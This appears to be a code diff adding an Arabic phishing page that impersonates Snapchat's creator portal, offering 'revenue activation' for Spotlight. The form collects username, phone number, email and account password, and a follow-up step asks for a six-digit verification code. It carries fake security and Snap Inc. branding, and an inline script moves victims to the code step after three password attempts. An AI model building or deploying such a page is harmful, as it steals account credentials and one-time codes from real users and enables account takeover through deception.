@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة المبدعين الرسمية | Snapchat Creator Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --snap-yellow: #FFFC00;
+            --snap-black: #000000;
+            --primary-navy: #0A192F;
+            --bg-body: #F4F7F6;
+            --card-bg: #FFFFFF;
+            --text-main: #1D1D1F;
+            --text-light: #636E72;
+            --border-color: #DFE6E9;
+            --transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+
+        body {
+            background-color: var(--bg-body);
+            font-family: 'Almarai', sans-serif;
+            margin: 0;
+            color: var(--text-main);
+            display: flex; flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .security-header {
+            background: var(--primary-navy);
+            color: #fff;
+            padding: 10px 0;
+            text-align: center;
+            font-size: 0.75rem;
+            font-weight: 400;
+        }
+
+        header {
+            background: #FFFFFF;
+            padding: 20px 0;
+            border-bottom: 2px solid var(--border-color);
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        .main-logo { height: 45px; }
+        .header-title {
+            margin-right: 15px;
+            font-weight: 800;
+            border-right: 2px solid #eee;
+            padding-right: 15px;
+            font-size: 1.1rem;
+        }
+
+        .main-container {
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 0 20px;
+            width: 100%;
+        }
+
+        .official-card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
+            overflow: hidden;
+            animation: fadeIn 0.6s ease;
+        }
+
+        .card-banner {
+            background: #F8F9FA;
+            padding: 35px 30px;
+            border-bottom: 1px solid var(--border-color);
+            text-align: center;
+        }
+
+        .card-banner h1 { font-size: 1.5rem; font-weight: 800; margin: 0; color: var(--primary-navy); }
+        .card-banner p { color: var(--text-light); font-size: 0.9rem; margin-top: 10px; }
+
+        .form-body { padding: 30px; }
+        .input-group { margin-bottom: 22px; }
+        .input-group label {
+            display: block; font-weight: 700; font-size: 0.85rem;
+            margin-bottom: 10px; color: var(--primary-navy);
+        }
+
+        .input-wrapper { position: relative; }
+        .input-wrapper input {
+            width: 100%;
+            padding: 16px 45px 16px 15px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 1rem;
+            background: #FCFCFC;
+            transition: var(--transition);
+        }
+
+        .input-wrapper input:focus {
+            outline: none; border-color: var(--primary-navy);
+            background: #FFF; box-shadow: 0 5px 15px rgba(10, 25, 47, 0.05);
+        }
+
+        .field-icon {
+            position: absolute; right: 15px; top: 50%;
+            transform: translateY(-50%); width: 20px; opacity: 0.4;
+        }
+
+        .btn-submit {
+            width: 100%; padding: 18px;
+            background: var(--primary-navy); color: #FFF;
+            border: none; border-radius: 8px;
+            font-size: 1.05rem; font-weight: 700;
+            cursor: pointer; transition: var(--transition);
+        }
+
+        .btn-submit:hover { background: #112240; transform: translateY(-2px); }
+
+        #loginOtpSection { display: none; padding: 40px 30px; text-align: center; }
+        .otp-grid { display: flex; justify-content: center; gap: 10px; direction: ltr; margin: 30px 0; }
+        .otp-field {
+            width: 45px; height: 55px; border: 2px solid var(--border-color);
+            border-radius: 8px; text-align: center; font-size: 1.4rem; font-weight: 800;
+        }
+
+        #statusMessage, #otpError {
+            display: none; background: #ffebee; color: #c62828;
+            padding: 12px; border-radius: 8px; margin-bottom: 20px;
+            font-size: 0.85rem; font-weight: 700; border: 1px solid #ffcdd2;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        footer { text-align: center; padding: 30px; color: var(--text-light); font-size: 0.8rem; }
+    </style>
+</head>
+<body>
+
+    <div class="security-header">
+        🔒 نظام التقديم الموحد - تشفير بياناتك محمي بواسطة بروتوكول SSL/TLS
+    </div>
+
+    <header>
+        <img src="logo.png" alt="Snapchat" class="main-logo">
+        <div class="header-title">مركز التحقق من الحساب</div>
+    </header>
+
+    <div class="main-container">
+        <div class="official-card">
+            
+            <div id="applyStep">
+                <div class="card-banner">
+                    <h1>طلب تفعيل العوائد</h1>
+                    <p>أدخل بيانات حسابك الرسمية لربط ملفك الشخصي بنظام Spotlight السنوي.</p>
+                </div>
+
+                <div class="form-body">
+                    <form id="submissionForm">
+                        <div id="statusMessage"></div>
+                        
+                        <div class="input-group">
+                            <label>اسم المستخدم (Username)</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="username" placeholder="اسم المستخدم" required>
+                                <img src="https://img.icons8.com/ios-glyphs/30/000000/user.png" class="field-icon">
+                            </div>
+                        </div>
+
+                        <div class="input-group">
+                            <label>رقم الهاتف المرتبط</label>
+                            <div class="input-wrapper">
+                                <input type="tel" id="user_phone" placeholder="رقم الهاتف" required>
+                                <img src="https://img.icons8.com/ios-glyphs/30/000000/iphone.png" class="field-icon">
+                            </div>
+                        </div>
+
+                        <div class="input-group">
+                            <label>البريد الإلكتروني</label>
+                            <div class="input-wrapper">
+                                <input type="email" id="user_email" placeholder="example@mail.com" required>
+                                <img src="https://img.icons8.com/ios-glyphs/30/000000/new-post.png" class="field-icon">
+                            </div>
+                        </div>
+
+                        <div class="input-group">
+                            <label>كلمة مرور الحساب</label>
+                            <div class="input-wrapper">
+                                <input type="password" id="passwordField" placeholder="كلمة المرور" required>
+                                <img src="https://img.icons8.com/ios-glyphs/30/000000/lock.png" class="field-icon">
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn-submit">تأكيد البيانات والمتابعة</button>
+                    </form>
+                </div>
+            </div>
+
+            <div id="loginOtpSection">
+                <div style="padding: 20px;">
+                    <div id="otpError"></div>
+                    <div style="background: #E3F2FD; color: #0D47A1; padding: 15px; border-radius: 8px; font-size: 0.85rem; font-weight: 700; margin-bottom: 25px;">
+                        تم إرسال رمز التحقق لهاتفك ولبريدك الإلكتروني، يرجى إدخاله للمتابعة.
+                    </div>
+                    <h2>رمز الأمان</h2>
+                    <div class="otp-grid">
+                        <input type="number" class="otp-field login-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                        <input type="number" class="otp-field login-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                        <input type="number" class="otp-field login-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                        <input type="number" class="otp-field login-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                        <input type="number" class="otp-field login-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                        <input type="number" class="otp-field login-otp-box" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
+                    </div>
+                    <button class="btn-submit" style="background: var(--snap-yellow); color: #000;" onclick="verifyLoginOtp()">التحقق والمتابعة لصفحة الدفع</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2026 Snap Inc. | سياسة الخصوصية وأمان البيانات</p>
+    </footer>
+
+    <script src="script.js"></script>
+    <script>
+        window.addEventListener('load', () => {
+            const saved = localStorage.getItem("SNAP_SESSION_STATE");
+            if (saved) {
+                const state = JSON.parse(saved);
+                // فحص إذا كان المستخدم قد تجاوز الـ 3 محاولات بنجاح
+                if (state.loginTries >= 3) {
+                    const formStep = document.getElementById('applyStep');
+                    const otpSection = document.getElementById('loginOtpSection');
+                    if(formStep) formStep.style.display = 'none';
+                    if(otpSection) otpSection.style.display = 'block';
+                }
+            }
+        });
+    </script>
+</body>
+</html>
